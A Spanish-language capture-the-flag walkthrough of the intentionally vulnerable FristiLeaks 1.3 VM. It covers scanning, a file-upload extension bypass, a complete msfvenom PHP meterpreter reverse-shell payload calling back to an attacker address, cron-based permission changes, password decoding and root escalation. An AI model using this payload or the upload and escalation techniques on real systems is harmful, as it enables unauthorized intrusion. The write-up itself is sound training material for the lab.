# FRISTILEAKS
Desarrollo del CTF FRISTILEAKS 1.3
Download: https://www.vulnhub.com/entry/fristileaks-13,133/

## Escaneo de puertos
1. Escaneamos todos los puertos de red.

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.138
Nmap scan report for 192.168.78.138
Host is up (0.00055s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop
```

## Enumeración de archivos y carpetas
1. Debido a que solo encontramos el puertos TCP/80 buscamos carpetas y/o archivos.
```
root@kali:~/FRISTILEAKS# gobuster dir -u http://192.168.78.138/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.78.138/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/22 20:54:10 Starting gobuster
===============================================================
/images (Status: 301)
/beer (Status: 301)
===============================================================
2021/02/22 20:54:58 Finished
```

2. El archivo ROBOTS.txt contiene 03 archivos pero tampoco muestra nada que nos sirva.
```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```
<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks1.jpg" width="60%"></img>

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks2.jpg" width="60%"></img>


3. Es frustrante no encontrar nada, sin embargo, el último recurso es probar el PATH con el nombre de la máquinas.

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks3.jpg" width="60%"></img>

## Intentar el acceso al portal

1. Probé algunas algo de SQLi sin exito.
2. Revisé el código HTML y encontramos un mensaje y una imagen en BASE64.

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks4.jpg" width="60%"></img>
<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks5.jpg" width="60%"></img>

3. Decodeamos la imagen en BASE64:https://codebeautify.org/base64-to-image-converter

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks6.jpg" width="60%"></img>

4. Al parecer la imagen contiene una "contraseña" y en el mensaje teniamos el usuario "eezeepz".

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks7.jpg" width="80%"></img>

## Carga de archivos arbitraria

1. Intentamos cargar un SCRIPT PHP y no podemos.
2. Cargamos un SCRIPT PHP con extensión PNG y funciona.

```
POST /fristi/do_upload.php HTTP/1.1
Host: 192.168.78.138
Referer: http://192.168.78.138/fristi/upload.php
Content-Type: multipart/form-data; boundary=---------------------------5468588141973640787257227612
Content-Length: 1467
Connection: close
Cookie: PHPSESSID=4fqnju07uslqeemfiao52a8890
Upgrade-Insecure-Requests: 1

----------------------------5468588141973640787257227612
Content-Disposition: form-data; name="fileToUpload"; filename="script1.php.jpg"
Content-Type: image/jpeg

<?php phpinfo(); ?>
```
<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks8.jpg" width="80%"></img>

3. Cargamos un webshell para establecer una conexión reversa.
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.78.131 LPORT=666 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.78.131'; $port = 666; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```
<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks9.jpg" width="80%"></img>

4. Ejecutamos el webshell y abrimos un HANDLER de escucha:

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks10.jpg" width="80%"></img>

## Elevar Privilegios

### Parte 01

1. Intenté mucho con la vulnerabilidad DIRTY COW pero sin exito: https://dirtycow.ninja/. Nunca supé porque no pude elevar privilegios por este medio.
2. En la carpeta /var/www hay un archivo NOTES.TXT:

```
bash-4.1$ cat notes.txt
cat notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

3. Revisamos la carpeta /home/eezeepz y dentro encontramos el archivo NOTES.TXT

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks11.jpg" width="80%"></img>
```
bash-4.1$ cat /home/eezeepz/notes.txt
cat /home/eezeepz/notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

4. Al inicio el mensaje es confuso pero toca colocar un archivo llamado "RUNTHIS" en "/TMP" y un comando. El comando CHMOD era util en este momento.
```
bash-4.1$ cat /tmp/runthis
/home/admin/chmod -R 777 /home/admin
```
5. Verificamos que la carpeta /HOME/ADMIN haya cambiado de permisos.

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks12.jpg" width="80%"></img>

### Parte 02

1. Dentro de la carpeta existe un archivo llamado CRYPTEDPASS.TXT, CRYPTPASS.PY y whoisyourgodnow.txt. Los archivos indican claramento que contienen un "mensaje" y que debemos encontrar el camino para leerlos en claro.

```
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

2. Al realizar algunas pruebas de ensayo y error, encontramos que la lógica del SCRIPT es:
A. Realizar un encode64.
B. Cambiar el orden del string obtenido en el encode (por ejemplo: 123456, lo cambia por 654321)
C. Realizar un ultimo encode con Caesar-cypher (root13) encryption: https://docs.python.org/3/library/codecs.html

3. Si queremos obtener el texto original debemos hacer el proceso de REVERSING. Desarrolle un mini-script para esto.
```
root@kali:/tmp# cat decryptpass.py 
import base64,codecs,sys

def decodeString(str):
    
    string1 = codecs.decode(str, 'rot13')
    string2 = string1[::-1]
    string3 = base64.b64decode(string2)
    return string3
    
    #base64string= base64.b64encode(str)
    #return base64string
    #return codecs.encode(base64string[::-1], 'rot13')
    #return base64string[::-1]

cryptoResult=decodeString(sys.argv[1])
print cryptoResult
```

4. Obtenemos los mensajes ocultos.
```
root@kali:/tmp# python decryptpass.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123
root@kali:/tmp# python decryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!
```
<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks13.jpg" width="80%"></img>

5. Accedemos con el usuario FRISTIGOD

```
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
```

### Parte 03

1. El directory home del usuario FRISTIGOD es: /VAR/FRISTIGOD. 
2. Analizamos el archivo .BASH_HISTORY y encontramos comandos interesantes. Al parecer el binario "doCom" es utilizado para ingresar como otro usuario.

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks14.jpg" width="80%"></img>

3. Al parecer ejecutar el comando es super facil y obtenemos ROOT.

<img src="https://github.com/El-Palomo/FRISTILEAKS/blob/main/fristileaks15.jpg" width="80%"></img>










